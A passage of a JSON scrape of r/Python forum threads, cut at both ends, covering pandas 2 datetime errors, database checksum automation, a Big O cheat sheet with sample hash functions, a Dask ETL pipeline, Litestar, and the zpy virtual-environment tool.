tool; however it lacks the ability to hook into your program in any other way than fully running the python process.\nchatpdb meets you where you are – AI tooling that’s only invoked when you need it. We hope you give it a try! We’d love any feedback or suggestions.\nDocs",
    "comments": []
},
{
    "post_author": "technically_right_",
    "post_id": "1c5b5ky",
    "post_score": "4",
    "post_time": "Tuesday, April 16, 2024 at 11:40:17 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Using Pandas 2 and different datetime erros",
    "media": [],
    "post_content": "Hey Folks,\nI am working on a project that uses a bit old pandas version (1.5.3). I am trying to update it and use a more recent version (2.2.2). Its the first time I use pandas 2 btw. I simply ran all my unit tests and got multiple and different errors all concerning some datetime aspects. I tried troubleshooting by searching the errors and look in pandas release note but I find really complicated. It feels like the documentation is really exhaustive but I could really use a note on principal errors one can get switching to pandas 2.\nDoes anyone have any handy blogpost, article, documentation that specifies this ? My focus is mainly on datetime errors when differences computed or comparaisons\nThanks",
    "comments": [
        {
            "author": "justanothersnek",
            "score": "2",
            "content": "Maybe check out the release notes.  Pandas 2.2 became more strict with datetime values.  It wants higher resolution dates per their release notes."
        },
        {
            "author": "Lambda11",
            "score": "2",
            "content": "What worked for me was replacing anywhere I had Python datetime with pandas.Timestamp https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.Timestamp.html#pandas.Timestamp. If you are inside of a function working on a single value use pandas.Timestamp instead of datetime. If you have a Series or DataFrame you can use https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.to_datetime.html. If you do that, then the other operations on dates should work as expected."
        },
        {
            "author": "runawayasfastasucan",
            "score": "3",
            "content": "I would try to post the errors. But honestly, if you are updating the project you might want to switch Pandas with Polars while you are at it.",
            "replies": [
                {
                    "author": "technically_right_",
                    "score": "3",
                    "content": "I've heard about Polars but I thought pandas 2 was bringing similar advantages. Maybe I should check it !",
                    "replies": [
                        {
                            "author": "runawayasfastasucan",
                            "score": "2",
                            "content": "I have always used Pandas, but have now started to use Polars and refactoring to use Polars in older project that is still in use. There is a big performance gain, obviously most noticeable for larger data. While it was something else to wrap your head around the syntax in Polars, especially coming from Pandas, I find that once it clicked I like it.",
                            "replies": [
                                {
                                    "author": "gerdes88",
                                    "score": "1",
                                    "content": "If you're using large datasets why not just use pyspark?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "big_data_mike",
            "score": "1",
            "content": "What kinds of errors are you getting? Does it have anything to do with daylight savings time? Are you handling data in different time zones? I do a lot of date time stuff at my job"
        },
        {
            "author": "haasvacado",
            "score": "-1",
            "content": "Welcome to hell. God speed, fren."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c8bxz5",
    "post_score": "4",
    "post_time": "Saturday, April 20, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Embarrassed-Mix6420",
            "score": "1",
            "content": "Looking for: Decent full tutorials for Python GUI frameworks that are used in production Official documentation/video Personal experience recommendations are best Should be better then https://www.youtube.com/watch?v=l8Imtec4ReQ&t=1312s and https://www.youtube.com/watch?v=Jn0PpzB14Y8&t=327s Both PySide and Kivy have issues The drawbacks of PySide is that it doesn't support mobile (which C++ foundation actually does with Android) The drawback of Kivy is its event loop management, documentally undefined behavior with multiple weird aliases and names for same or slightly different things which end up being complete PitA - overall it's founded by a single french freelance guy who coded it their way and quickly without it being a production viable robust framework with end-user detail and configurability in mind Any expert advice is appreciated"
        },
        {
            "author": "GoldenTreasure1",
            "score": "1",
            "content": "https://python-fiddle.com This is a cool thing I found, while searching the web. Anyways i thought it was pretty cool"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c2oa6w",
    "post_score": "0",
    "post_time": "Saturday, April 13, 2024 at 3:00:13 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "doinky_doink",
    "post_id": "j1lk03",
    "post_score": "1844",
    "post_time": "Tuesday, September 29, 2020 at 12:38:34 AM GMT+3",
    "flair_text": "Beginner Showcase",
    "post_title": "I just automated an actual job I have at work.",
    "media": [],
    "post_content": "Spent 5 hours coding for what could have been hundreds of hours of work. I can't believe I actually did it. Lol\nOf course I did it with the help of my google-fu but the fact that I was able to do it is such a great feeling of accomplishment. Received a \"Great Work!\" message from my boss too.\nEDIT: HERE'S WHAT I DID. I kinda messed up not including this in the main post.\nBasically I needed to make comparison of a new cloned server vs our old one.\nIt has hundreds if not thousand of tables that I'll need to do binary check sums of to ensure that the newly created servers and dbs are completely identical and that the etl procedures are loading the data correctly with the correct data types and values etc.\nSo without automation I'll have to do this hundreds if not thousands of times manually:\nRun checksum code on old server then run on old server, save the checksum results on an excel worksheet as documentation if they or did not match.\nWhat I did is I created a python automation program that gets a list of all tables in a db within a server, then iterates over all those tables and executes the binary check sum query again and again using the tables on a list then saves all the query result on a csv file.\nI appended the csv output names with the server name to make them distinct after every run. Then I load that csv to an excel file and then do the final IF comparisons there.\nSo instead of doing that manual comparison for hundreds of hours, I was able to do it in 5 hours of coding and now runs for 30 second per database then voila, instant results.\nI'm so proud of this not gonna lie.",
    "comments": [
        {
            "author": "kidcanada0",
            "score": "156",
            "content": "Cool! Any details you can share?",
            "replies": [
                {
                    "author": "doinky_doink",
                    "score": "281",
                    "content": "Okay sorry for late reply. Basically I needed to make comparison of a new cloned server vs our old one. It has hundreds if not thousand of tables that I'll need to do binary check sums of to ensure that the newly created servers and dbs are completely identical and that the etl procedures are loading the data correctly with the correct data types and values etc. So without automation I'll have to do this hundreds if not thousands of times manually: Run checksum code on old server then run on old server, save the checksum results on an excel worksheet as documentation if they or did not match. What I did is I created a python automation program that gets a list of all tables in a db within a server, then iterates over all those tables and executes the binary check sum query again and again using the tables on a list then saves all the query result on a csv file. I appended the csv output names with the server name to make them distinct after every run. Then I load that csv to an excel file and then do the final IF comparisons there. So instead of doing that manual comparison for hundreds of hours, I was able to do it in 5 hours of coding and now runs for 30 second per database then voila, instant results. I'm so proud of this not gonna lie.",
                    "replies": [
                        {
                            "author": "AxelsAmazing",
                            "score": "177",
                            "content": "This should be the main post."
                        },
                        {
                            "author": "AussieMazza",
                            "score": "48",
                            "content": "Great work! Also, it's probably best to automate tasks like this. The chance of an error when checking that much 'dry' information (checksums etc) is massive. If you get code to do it, as long as the code is sound, you will also significantly reduce the chance of human error."
                        },
                        {
                            "author": "mysticalfruit",
                            "score": "37",
                            "content": "Thays awesome! Next challenge.. make that code multi threaded. Run your initial query and load the table names into a Queue() object. Then have each thread create its own connection to the database, evaluate the table and generate the checksums and then store the results.",
                            "replies": [
                                {
                                    "author": "doinky_doink",
                                    "score": "4",
                                    "content": "Saving this. I'll look on how to do these things you said."
                                }
                            ]
                        },
                        {
                            "author": "Tora_Makun",
                            "score": "6",
                            "content": "Have to say, that's damn impressive! Well done !"
                        },
                        {
                            "author": "jedferreras",
                            "score": "11",
                            "content": "As I was reading this I totally felt like I was watching one of those hacking scenes in movies where a nerd (no offense) explains themselves super quickly as if they're emptying the contents of their brain onto the listener whilst also typing furiously"
                        },
                        {
                            "author": "camtarn",
                            "score": "3",
                            "content": "Very cool - nice work!"
                        },
                        {
                            "author": "Starrk94",
                            "score": "1",
                            "content": "Just question in topic: is there any reason you chose comparing lists instead of using pandas/ numpy dataframes and dropping duplicates to look for difference?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "I told him because our evaluation period is going to be next month and I'm very sure that this project would impact my review just because of how much manual work I was able to automate lol. It's only me who would've suffered doing this manually if not automated anyway so win win i think.",
            "replies": [
                {
                    "author": "doinky_doink",
                    "score": "309",
                    "content": "I told him because our evaluation period is going to be next month and I'm very sure that this project would impact my review just because of how much manual work I was able to automate lol. It's only me who would've suffered doing this manually if not automated anyway so win win i think."
                }
            ]
        },
        {
            "author": "HereForAnArgument",
            "score": "16",
            "content": "If necessity is the mother of invention, laziness is its father. I spent three months writing an application that took a 3 day per week task and made it three hours per week and all I got was the expectation that I would do it again."
        }
    ]
},
{
    "post_author": "tjdwill",
    "post_id": "1c55b88",
    "post_score": "2",
    "post_time": "Tuesday, April 16, 2024 at 5:46:00 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "kmeans-tjdwill: A K-Means Implementation that Maintains Data Association",
    "media": [
        "https://github.com/tjdwill/KMeans_Clustering"
    ],
    "post_content": "Hello,\n  I recently published my first Python package on PyPi called kmeans-tjdwill (source). This is a k-means clustering implementation I wrote as a toy project that eventually was used extensively throughout my Master's degree, especially in my thesis. After a refactor and some optimization, I wanted to post here to hopefully elicit feedback and commentary from more experienced, professional software engineers.\nWhat My Project Does\nThe central function is kmeans.cluster which segments input data into groups based on proximity to centroids. Users may either specify the initial means themselves or allow them to be chosen from among the input data. There is also a function for viewing the clustering process for 2-D and 3-D data, and, finally, a function that uses kmeans.cluster to perform image segmentation. Visual examples of both are found on the landing page of the Github repo linked above.\nComparison\nThis k-means clustering implementation is different from others I've seen in that it maintains what I call—for want of a better term—data association. The example I use is with object detection data. Say we have object detection data where each detection is of form\n[x_min, y_min, x_max, y_max, conf, label_id]\nNormally, if we want to cluster based on the first four elements (the bounding box data), we would lose track of the remaining two elements as the data is shuffled around during clustering. If we were to instead cluster based on all of the elements, the centroid values would be affected by the extra elements because we'd be clustering 6-D data instead of 4-D. This package provides a way to cluster based on the first four elements while also maintaining the association with the remaining data through the ndim parameter.\nThis means that once the data is done clustering, you can then use the remaining data for further processing. In this project's implementation of image segmentation, for example, I leverage the above such that each (R,G,B) pixel remembers its original image coordinates. This was very useful for replacing each pixel in a given cluster with the centroidal color value.\nTarget Audience\nWhile I did use the first iteration of this project through multiple projects of my Master's degree, it is certainly not on the level of industry. Hopefully, this project can be used for exploration by those learning the concept.\n  I've never had a code review before, so I appreciate any feedback or suggestions for improvement. Thank you for your time.",
    "comments": []
},
{
    "post_author": "treyhunner",
    "post_id": "1c5l9px",
    "post_score": "206",
    "post_time": "Tuesday, April 16, 2024 at 8:01:57 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Big O Cheat Sheet: the time complexities of operations Python's data structures",
    "media": [
        "https://www.pythonmorsels.com/time-complexities/",
        "https://nedbatchelder.com/text/bigo.html"
    ],
    "post_content": "I made a cheat sheet of all common operations on Python's many data structures. This include both the built-in data structures and all common standard library data structures.\nThe time complexities of different data structures in Python\nIf you're unfamiliar with time complexity and Big O notation, be sure to read the first section and the last two sections. I also recommend Ned Batchelder's talk/article that explains this topic more deeply.",
    "comments": [
        {
            "author": "moonzdragoon",
            "score": "54",
            "content": "Good for people getting into programming in general. I only have one remark: I wouldn't qualify O(n) as \"Slow !\" since it's still practically fast for low values of n and has the elegance of scaling linearly, which is one of the best scenarios available in the vast amount of cases a programmer will face.",
            "replies": [
                {
                    "author": "treyhunner",
                    "score": "15",
                    "content": "Agreed! There are no O(n²) operations in these tables, so I would think of most of these operations as fairly fast when used in isolation. The problem comes with performing any of the O(n) and O(n log n) operations in a loop. That \"Notably\" column is the one I've fretted over the most while drafting this. If you have an idea for how to annotate these operations as \"this operation is faster/slower than you might expect at first glance\", I'm all ears!"
                },
                {
                    "author": "MrJohz",
                    "score": "2",
                    "content": "It's also worth remembering that Big-O isn't about how fast or slow a given function is, but how that function scales for different values of n. Hashmaps are a good example. For some types of hashmap/dict, if the hash function is poorly designed, it's possible to break (or at least DOS) a system by carefully crafting keys that all result in the same hash value. Well-designed hash functions are typically quite slow, but can largely avoid this situation. As a result, if you know you're never going to get more than maybe 5-10 values in your data structure, it might be quicker to use a list instead. Looking a value up in a list is O(n), but if n is small, then it may well be quicker than looking it up in an O(1) dict, as long as the (single) hash function call takes longer than the search. In practice, dicts are still a good default data structure to use if you're looking values up a lot, particularly in Python where the hashing will mostly be done in C, whereas a manual search will probably be mostly Python. But it's quite easy to run into this situation in more low-level languages like Rust, where the built-in hashmap uses a slow hash function by default, and where looking up a value in an array can be done very quickly. (Although in practice, dicts/hashmaps are still better generally for data that you need to look up, because they're usually clearer. The performance aspects will come in mostly for very large data (10k, 100k+ elements), or hot loops/bottlenecks. And for bottleneck code, it's probably worth profiling the code first to find where the problems are really occurring."
                }
            ]
        },
        {
            "author": "Commander_B0b",
            "score": "12",
            "content": "Saying that iterating a list item by item being O(n) and there for slow feels weird to me. How can you go any faster? Your probably going to give some freshman that read this anxiety over certain operations.",
            "replies": [
                {
                    "author": "treyhunner",
                    "score": "4",
                    "content": "You're right that there's no getting around looping if looping is what you need. That column is intended to call out operations that are deceptively fast/slow. A for loop looks as \"slow\" as it is, so I didn't put \"Slow!\" next to it, but I did put \"Slow!\" next to the in operator. My students often don't expect the in operator to be as slow as a for loop on a list. I spent an embarassing amount of time trying to figure out how I wanted to quickly convey which operations may be deceptive in their speed. That \"Notably\" column is the best I came up with and I'm not fully satisfied with it. Suggestions welcome!"
                }
            ]
        },
        {
            "author": "FoeHammer99099",
            "score": "7",
            "content": "Technically list.append is O(n), it's just that that only happens when the list is full and you need to reallocate and copy everything into a bigger list. Since that happens after appending approx. n times, we usually say that we can amortize the cost of the expensive append across all the other practically free ones. Doing amortized analysis is fine (it's probably more useful that worst case analysis here), but you should be clear about what you're doing."
        },
        {
            "author": "hextree",
            "score": "2",
            "content": "Hash map operations are O(n), but have expected O(1) behaviour for suitably random choices of hash functions. I get that it's a bit complex to go into for the purpose of a cheat sheet, but might want to make a note somewhere at least. I once got called out for saying O(1) in a Google interview."
        },
        {
            "author": "McNickSisto",
            "score": "1",
            "content": "Could you develop a little how sets and dictionaries use hash tables/maps ? I still do not understand how these hashes are assigned ? For each iterable, there is a hash associated to it ? Are the elements in the sets are hashed as well ? Thanks in advance.",
            "replies": [
                {
                    "author": "treyhunner",
                    "score": "4",
                    "content": "Dictionaries and sets rely on Python's built-in hash function (which relies on the __hash__ method on the object being hashed). So it's up to the object to compute a relatively unique hash value for itself. Here's a quick summary on that That means that any object you can use as a key in a dictionary or you can store within a set must return a number when passed to Python's built-in hash function. Also the hash value of that object will never change (bad things happen if it were to change). If you're wondering \"what's the math involved in computing these hash values\"... well it's often a bit weird. Warning: you don't actually need to understand any of the below. Python does it for you! Here's an example of what Python's implementation of hashing a string might look like (it's not quite like this but it's similar): def string_hash(string): hash_value = 0 for char in string: hash_value = (hash_value << 5) - hash_value + ord(char) hash_value = hash_value & 0xffffffff  # Constrain to 32 bits if hash_value & 0x80000000:  # Convert to signed 32-bit integer hash_value = -((hash_value ^ 0xffffffff) + 1) if hash_value == -1: hash_value = -2  # -1 hash is special return hash_value And hashing a tuple probably looks a bit like this: def tuple_hash(tup): hash_value = 0x345678 mult = 1000003 for item in tup: hash_value = (hash_value ^ hash(item)) * mult hash_value = hash_value & 0xffffffff  # Constrain to 32 bits mult = (mult * 82520 + 2) & 0xffffffff  # Update multiplier hash_value = hash_value ^ len(tup) hash_value = hash_value & 0xffffffff  # Constrain to 32 bits if hash_value & 0x80000000:  # Convert to signed 32-bit integer hash_value = -((hash_value ^ 0xffffffff) + 1) if hash_value == -1: hash_value = -2  # -1 hash is special return hash_value Notice that this is bitwise arithmetic. A classic bitwise operation in hashing algorithms is XOR (^). A generic function that could \"hash\" any object might look like this: import pickle def hash_anything(thing): raw_bytes = pickle.dumps(thing) hash_bytes = bytearray([0] * 8) for i, byte in enumerate(raw_bytes): hash_bytes[i % 8] ^= byte return int.from_bytes(hash_bytes, signed=True) You don't need to understand any of that though. Just accept that Python is using the magic of mathematics to turn tuples, strings, integers, floating point numbers, and other hashable friends into numbers that are very unlikely to \"collide\" with the hash value of other objects that represent something different."
                }
            ]
        },
        {
            "author": "old_bearded_beats",
            "score": "1",
            "content": "For a beginner, this is excellent. Literally just had a lecture on this very topic tonight! Do you mind me asking about that heap module? Is it somehow pulling from the stack to heap by moving arguments out of functions in to global, or is it too do with passing by values Vs by reference? Or am I barking up the wrong tree?! Edit: typo"
        }
    ]
},
{
    "post_author": "BeneficialBear",
    "post_id": "cl1fad",
    "post_score": "1757",
    "post_time": "Friday, August 2, 2019 at 11:35:00 AM GMT+3",
    "flair_text": "",
    "post_title": "So i turned old processor into keychain. What do you guys think about it?",
    "media": [
        "https://preview.redd.it/fvypokfoyzd31.jpg?width=640&crop=smart&auto=webp&s=4c561befa0241049b9e0fd86b0e3ceb7f32f75cf",
        "https://i.redd.it/fvypokfoyzd31.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "I probably contain that much gold, can i be a gold keychain?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "75",
                    "content": "I probably contain that much gold, can i be a gold keychain?",
                    "replies": [
                        {
                            "author": "fuzzer37",
                            "score": "10",
                            "content": "I have nipples, Mark. Can you milk me?"
                        },
                        {
                            "author": "palebrew",
                            "score": "3",
                            "content": "username checks out"
                        }
                    ]
                }
            ]
        },
        {
            "author": "0Rapanhte",
            "score": "21",
            "content": "Wow, that's insanely cool! How did you \"printed\" the logo on it? Is the PCB strong enough to support the weight of the CPU? Are there any tips or tricks for it? I never know it but ... I WANT ONE! Edit: Just checked again, you just exposed the copper with for the logo right? Did you use acid?"
        },
        {
            "author": "oinkbar",
            "score": "14",
            "content": "nice, but i would polish the sharp edges"
        },
        {
            "author": "matthewZHAO",
            "score": "25",
            "content": "What processor is it"
        },
        {
            "author": "_prime07",
            "score": "6",
            "content": "Saw this and immediately made one for myself. Damn, after all these years of collecting this old stuff, finally a good idea for reuse :D"
        },
        {
            "author": "Winnipesaukee",
            "score": "11",
            "content": "That I can only use one thread on the CPU because of the GIL. 🤪 But seriously, that is amazing."
        },
        {
            "author": "ExternalPanda",
            "score": "4",
            "content": "Did you remove the pins? Looks to me like they'd be really annoying inside your pockets"
        },
        {
            "author": "ThePixelCoder",
            "score": "4",
            "content": "Looks painful to put in your pockets"
        },
        {
            "author": "hem1t",
            "score": "3",
            "content": "What can I do with laptop RAM any idea."
        },
        {
            "author": "SamTheWicked",
            "score": "2",
            "content": "Sweet"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c51rs9",
    "post_score": "2",
    "post_time": "Tuesday, April 16, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "dask-jeeves",
    "post_id": "1c1fg55",
    "post_score": "34",
    "post_time": "Thursday, April 11, 2024 at 4:45:04 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Example Data Pipeline with Prefect, Delta Lake, and Dask",
    "media": [
        "https://github.com/coiled/etl-tpch",
        "https://docs.coiled.io/blog/easy-scalable-production-etl.html"
    ],
    "post_content": "I’m an OSS developer (primarily working on Dask) and lately I’ve been talking to users about how they’re using Dask for ETL-style production workflows and this inspired me to make something myself. I wanted a simple example that met the following criteria:\nRun locally (optionally). Should be easy to try out locally and easily scalable.\nScalable to cloud. I didn’t want to think hard about cloud deployment.\nPython forward. I wanted to use tools familiar to Python users, not an ETL expert.\nThe resulting data pipeline uses Prefect for workflow orchestration, Dask to scale the data processing across a cluster, Delta Lake for storage, and Coiled to deploy Dask on the cloud.\nI really like the outcome, but wanted to get more balanced feedback since lately I’ve been more on the side of building these tools rather than using them heavily for data engineering. Some questions I’ve had include:\nPrefect vs. Airflow vs. Dagster? For the users I’ve been working with at Coiled, Prefect is the most commonly used tool. I also know Dagster is quite popular and could easily be swapped into this example.\nDeltaLake or something else? To be honest I mostly see vanilla Parquet in the wild, but I’ve been curious about Delta for a while and mostly wanted an excuse to try it out (pandas and Dask support improved a lot with delta-rs).\nAnyway, if people have a chance to read things over and give feedback I’d welcome constructive critique.\nCode: https://github.com/coiled/etl-tpch\nBlog post: https://docs.coiled.io/blog/easy-scalable-production-etl.html",
    "comments": [
        {
            "author": "Ok_Expert2790",
            "score": "9",
            "content": "r/dataengineering 😎😎"
        },
        {
            "author": "dsethlewis",
            "score": "5",
            "content": "I’m a couple years into my data career and interested in this but basically have no idea what you’re talking about. If I want to learn more about the his stuff, do I look up data engineering resources?",
            "replies": [
                {
                    "author": "dask-jeeves",
                    "score": "2",
                    "content": "u/dsethlewis there are definitely a lot of resources out there! Is there a specific problem you're trying to solve/area you want to learn more about?"
                }
            ]
        },
        {
            "author": "ThatSituation9908",
            "score": "4",
            "content": "Cool for people who use Coiled. As someone who doesn't, and host their own Dask service (e.g., on K8s), I wish this article said more about Dask than Coiled (obviously you guys are Coiled writing an article on your product page).",
            "replies": [
                {
                    "author": "mrocklin",
                    "score": "2",
                    "content": "Yeah, makes sense. Everything that `@coiled.function` can be done with `dask.distributed.Client.submit` (it's just a wrapper around that and Coiled's ability to quickly spin up a cluster on the cloud). Mostly the message here is that Prefect is great at orchestration but that it needs to be coupled with something that can bring up hardware. This could be Fargate or EKS + Dask Kubernetes or something else. We're obviously partial to Coiled, and find it a lot easier to use for most people, which is nice. A lot of Prefect users are mildly annoyed with the setup process and the infrastructure monitoring they have to do."
                }
            ]
        }
    ]
},
{
    "post_author": "Hussain_Mujtaba",
    "post_id": "i73sy4",
    "post_score": "1841",
    "post_time": "Monday, August 10, 2020 at 3:21:27 PM GMT+3",
    "flair_text": "Machine Learning",
    "post_title": "Here is an absolute Beginners Tutorial that can help you guys to get started with Machine learning. All you need is some basic knowledge of Python. You will have created two ML models at the end of this tutorial and also know the working of some ML algorithms.",
    "media": [
        "https://external-preview.redd.it/aKrMt5nn13b3Tsyw9CDepz4AqlI40viAVWhoNo_iDJw.jpg?width=640&crop=smart&auto=webp&s=228d19d2c80563d366942740bb0221d740e66db8",
        "https://www.mygreatlearning.com/blog/machine-learning-tutorial-for-complete-beginners/?utm_source=myreddit-ML121"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "RealAmerik",
            "score": "44",
            "content": "Can't wait to test it out, will definitely provide feedback, thanks!",
            "replies": [
                {
                    "author": "Hussain_Mujtaba",
                    "score": "20",
                    "content": "thanks, and if you face any problems, do mention here please",
                    "replies": [
                        {
                            "author": "jmachee",
                            "score": "10",
                            "content": "So, as a minor nitpick: your headline says prospective learners only need “some basic knowledge of python”, however your tutorial starts with “First, you should be familiar with Pandas and NumPy”—neither of which is “basic python”. They’re each pretty heavy to get familiar with on their own. That said, I’ll likely give this a shot."
                        }
                    ]
                }
            ]
        },
        {
            "author": "ferrago",
            "score": "39",
            "content": "I just wanted to take the time to say thank you for this. I was forced into AI/ML tasking for my job, I know enough to accomplish what I need, but I recently got 3 new employees under me that have no experience, so this looks like it might be super beneficial for me. Also I target embedded devices and have worked pretty extensively with nvidia’s jetson devices. It might be beneficial if you had some mention of them, especially with their more consumer friendly priced jetson nano. It’s a great learning tool for working with AI especially if a person doesn’t have a dedicated gpu machine for training, and it’s only $100 USD. Plus there is massive community support for utilizing those devices for ML/AI."
        },
        {
            "author": "RNDASCII",
            "score": "9",
            "content": "Thank you so much!"
        },
        {
            "author": "tans_123",
            "score": "3",
            "content": "Thanks for sharing!"
        },
        {
            "author": "Random_182f2565",
            "score": "3",
            "content": "Thank you for sharing, A quick question if I want to train a network to recognize string of text as a label and then generate a generalization of that label, what do you recommend?"
        },
        {
            "author": "N1K5_",
            "score": "3",
            "content": "Thank you a lot"
        },
        {
            "author": "4chanbetterkek",
            "score": "3",
            "content": "Saving this one"
        },
        {
            "author": "taflad",
            "score": "7",
            "content": "!save"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "I wanted to learn ML for a very long time, but all the tutorials and courses I found were paid. Thanks a lot, I'll definitely check it out."
        },
        {
            "author": "razorfox",
            "score": "2",
            "content": "Wow bro it seems amazingly well done! Thank you for sharing"
        }
    ]
},
{
    "post_author": "I_will_delete_myself",
    "post_id": "1c3irsc",
    "post_score": "37",
    "post_time": "Sunday, April 14, 2024 at 5:21:17 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Is Litestar production ready 2024?",
    "media": [],
    "post_content": "At least a couple things that seems is that Litestar appears to be a fast Django lite. Some batteries included, but not too many and opinionated. It's uses Rust so of course it's going to be fast, not that it really matters that much since IO > CPU for a website IMO. Which any async framework addresses this.\nI haven't heard many people using it though despite it having a lot of batteries included, but not dominating everything with first party support. Anyone using it in production in 2024?\nEdit:\nFact check it appers it isn't written in Rust, I probably confused it with something else or it might just be data serialization",
    "comments": [
        {
            "author": "Ragoo_",
            "score": "18",
            "content": "I think you're mixing something up regarding Rust. Check out this comment by u/Goldziher from 7 months ago. Regarding your question, I am wondering the same thing. I found Litestar 2 weeks ago and build a little boilerplate for our Google Cloud Run services. I had a good time reading the documentation and code. For my purpose I definitely appreciate the use of msgspec, the performance, the easy setup and how quickly I was able to configure structlog (+ the built-in logging middleware) for Cloud Logging. Only thing I disliked so far is that the documentation seemed inconsistent/outdated sometimes. Like in some places it's showing pydantic examples even though pydantic is now optional. Same for using dataclasses instead of always using msgspec and some other small things I noticed."
        },
        {
            "author": "thisismyfavoritename",
            "score": "24",
            "content": "yeah"
        },
        {
            "author": "ReporterNervous6822",
            "score": "7",
            "content": "I’m using litestar in production. Yes"
        },
        {
            "author": "-defron-",
            "score": "4",
            "content": "I'm curious what makes you think it hasn't been ready before 2024? It's not the most popular framework, sure, but it receives regular updates, has multiple people working on it, and has a 100% code coverage unit test policy, uses type hints, requires docstrings for all methods, etc...",
            "replies": [
                {
                    "author": "I_will_delete_myself",
                    "score": "1",
                    "content": "Hadn’t heard many stories of it getting taken to production as of late.",
                    "replies": [
                        {
                            "author": "-defron-",
                            "score": "4",
                            "content": "That's purely a measure of popularity, not on production-readiness"
                        }
                    ]
                }
            ]
        },
        {
            "author": "MapCompact",
            "score": "4",
            "content": "I am using Litestar in production at my work. We have a bunch of flask services and just released our first Litestar service. AMA.",
            "replies": [
                {
                    "author": "dankgen-tobias",
                    "score": "2",
                    "content": "How do you handle authentication and user management? I was planning on using Litestar for a new production app but I am hesitant because of security concerns"
                }
            ]
        },
        {
            "author": "Flame_Grilled_Tanuki",
            "score": "11",
            "content": "I'm gradually transitioning my company away from Flask and Fastapi to Litestar and Django. It is at least as production ready as the big names, if not more so.",
            "replies": [
                {
                    "author": "iwkooo",
                    "score": "3",
                    "content": "What’s your reason to move away from FastAPI? Being curious"
                },
                {
                    "author": "airaith",
                    "score": "2",
                    "content": "Please expand on \"if not more so\"?"
                }
            ]
        },
        {
            "author": "djinn_09",
            "score": "3",
            "content": "You are talking about Robyn server written in RUST"
        },
        {
            "author": "EternityForest",
            "score": "5",
            "content": "Seems like everything Python is getting implemented in Rust lately!",
            "replies": [
                {
                    "author": "marr75",
                    "score": "4",
                    "content": "Nah, misunderstanding of Litestar. Read u/Ragoo_'s comment."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c1um1g",
    "post_score": "2",
    "post_time": "Friday, April 12, 2024 at 3:00:49 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "AndydeCleyre",
    "post_id": "1c4sarv",
    "post_score": "6",
    "post_time": "Monday, April 15, 2024 at 8:39:50 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "zpy can now use uv as a backend to replace Python's venv module and pip-tools",
    "media": [
        "https://user-images.githubusercontent.com/1787385/172661113-7a2c6670-e716-491e-8db4-c005fef8455b.png",
        "https://github.com/AndydeCleyre/zpy"
    ],
    "post_content": "Hello!\nWhat My Project Does\nzpy is a set of Zsh functions, mostly wrapping pip-tools or uv, for the simple and practical management of Python virtual environments, dependency specifications, and isolated Python app installation.\nYou may find it a suitable alternative to poetry, pipenv, pipx, or unaided pip-tools or uv.\nThere's a focus on use of good old requirements.txt files, and extensive tab completion assistance.\nIt's not new, but I just made a new release that can use uv as a backend, making it much faster (and hipper, obviously).\nTarget Audience (e.g., Is it meant for production, just a toy project, etc.)\nI'd say it's for folks who enjoy Zsh and tab completion, and a preference for \"vanilla\" and standards-based Python environment definitions. It's more oriented toward personal developer environments, not deployments. But it should work with the same requirements and pyproject.toml files that are used in production, with whatever tools you want to use there (e.g. pip).\nComparison (A brief comparison explaining how it differs from existing alternatives.)\nYou may find poetry or pipenv a good fit, and that's ok. I have personally found them to conflict with my needs and preferences:\nboth introduce new-syntax files\nneither can do what pipx does\npoetry is a bit rigid, only working with installable packages as projects (possibly outdated info, it was this way last time I tried)\npipenv is problematically nosy and weird sometimes, e.g. using unrelated files above the current folder without consent\nneither fully embrace the rich completions and other features that Zsh offers\nI have had only good experience with pipx, and replacing its features here was not an initial goal. I just couldn't resist when the other functions provided components for a transparent pipx substitute, with excellent tab completion.\nOne difference from using plain uv is that this manages venvs in an external directory, and not necessarily just one venv per project folder.\nMore Notes\nIf you have zpy installed, you can install uv with the pipz command, and from then on zpy will use uv instead of Python's venv module and pip-tools:\n% pipz install uv\nIf you have any questions, please ask!\nI personally use it in combination with mise (for Python runtime management) and flit (for package publishing), but aim to keep it rather agnostic and interoperable.\nHere's some more explanation copied from the readme:\nGuiding Ideas:\nYou should not have to manually specify the dependencies anywhere other than *requirements.in files\nFolks who want to use your code shouldn't have to install any new-fangled less-standard tools (pipenv, poetry, pip-tools, zpy, etc.); pip install -r *requirements.txt ought to be sufficient\nIt's nice to keep the venv folder outside of the project itself\nNot every manageable project needs a pyproject.toml or to be packaged\nLockfiles are good\nTab completion is wonderful\nThese functions don't:\nneed to be used exclusively\nneed to be used by everyone on the same project\ndo what mise/pyenv/asdf-vm or flit do best (but do work with them if you choose)\nconflict with anything else your team cares to do with your code; If they can be a friendlier neighbor to your workflows, file an 